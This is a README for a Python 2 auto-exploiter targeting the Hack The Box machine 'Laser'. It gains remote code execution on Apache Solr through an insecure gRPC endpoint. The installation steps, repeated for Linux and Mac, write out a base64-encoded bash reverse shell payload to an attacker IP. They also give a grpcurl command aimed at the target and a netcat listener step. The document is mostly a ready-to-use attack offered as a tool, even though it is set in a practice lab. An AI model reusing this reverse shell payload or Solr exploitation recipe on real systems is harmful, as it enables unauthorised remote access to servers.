# Pwnsolar-Laser-HTB
Auto-exploiter for 'Laser' on hackthebox | RCE Apache solr 

> I was bored so i went on hackthebox.eu, i did a box called 'laser' and to my suprise it was very hard..
> After i discovered Apache solr was running on port 8389 behind a insecure gRPC channel i had an idea
> 



## PWNER.py
[+] We send POST request to set params.resource.loader.enabled as true <br>
[+] We send GET request to exec command thru unicode <br>
[+] All requests sended using gRPC Framework <br>
[+] We use grpcurl to send requests <br>




## INSTALLATION

### Linux (Ubuntu/Debian)

1) Clone this repo [Autopwner Laser](https://github.com/EmirhanSarikaya/Pwnsolar-Laser-HTB.git) <br>
-> git clone https://github.com/EmirhanSarikaya/Pwnsolar-Laser-HTB.git <br>
2) Edit pwner.py, set your ip & port which u listen to at /dev/tcp/$IP/$PORT<br>
payload = 'bash -c {echo,' + base64.b64encode("bash -i >& /dev/tcp/10.10.x.x/6666 0>&1").replace('+','%2b') + '}|{base64,-d}|{bash,-i}' <br><br>
3) Edit pwner.py, set location of grpcurl & set laser.proto file & change ip of target machine <br>
cmd = '/home/$username/HTB/Laser/grpcurl -max-time 5 -plaintext -proto laser.proto -d \'{"data":"' + feed_url_b64 + '"}\' 10.10.10.201:9000 Print.Feed' <br>
4) python2 pwner.py & listen to nc -lvp 



### Mac


1) Clone this repo [Autopwner Laser](https://github.com/EmirhanSarikaya/Pwnsolar-Laser-HTB.git) <br>
-> git clone https://github.com/EmirhanSarikaya/Pwnsolar-Laser-HTB.git <br><br>
2) Edit pwner.py, set your ip & port which u listen to at /dev/tcp/$IP/$PORT<br>
payload = 'bash -c {echo,' + base64.b64encode("bash -i >& /dev/tcp/10.10.x.x/6666 0>&1").replace('+','%2b') + '}|{base64,-d}|{bash,-i}' <br>
3) Edit pwner.py, set location of grpcurl & set laser.proto file & change ip of target machine <br>
cmd = '/home/$username/HTB/Laser/grpcurl -max-time 5 -plaintext -proto laser.proto -d \'{"data":"' + feed_url_b64 + '"}\' 10.10.10.201:9000 Print.Feed' <br>
4) python2 pwner.py & listen to nc -lvp 


winblows :P

*** MADE IN PYTHON 2.7 ***
